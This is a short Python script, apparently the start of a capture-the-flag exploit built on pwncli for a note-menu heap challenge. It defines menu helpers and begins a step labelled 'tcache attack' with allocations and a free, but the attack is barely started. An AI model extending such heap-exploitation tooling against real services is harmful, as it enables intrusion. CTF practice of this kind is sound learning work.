#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'Your choice: \n')
    sl(i2b(choice))
def add(size, data):
    cmd(1)
    ru(b'[*] Note size: \n')
    sl(i2b(size))
    ru(b'[*] Note content: \n')
    s(data)
def delet(idx):
    cmd(2)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))
def edit(idx, data):
    cmd(3)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))
    ru(b'[*] Note content: \n')
    s(data)
def show(idx):
    cmd(4)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))

#  tcache attack
add(0x20, b"aaa")
add(0x20, b"aaa")
delet(0)

ia()
